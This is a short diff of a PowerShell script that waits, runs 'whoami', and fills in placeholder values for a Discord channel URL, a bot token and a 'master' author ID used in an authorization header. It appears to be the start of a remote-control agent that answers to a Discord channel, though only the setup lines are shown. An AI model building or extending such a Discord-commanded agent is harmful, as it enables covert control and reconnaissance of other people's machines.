@@ -2,10 +2,9 @@ Start-Sleep -Seconds 15
 
 $WhoAmI_Output = Invoke-Expression -Command "whoami"
 
-$url = ""
-$discordToken = ""
-
-$master_ID = ""
+$url = "<DISCORD_CHANNEL_URL>"
+$discordToken = "<DISCORD_BOT_TOKEN>"
+$master_ID = "<DISCORD_AUTHOR_ID>"
 
 $headers = @{
     Authorization = $discordToken
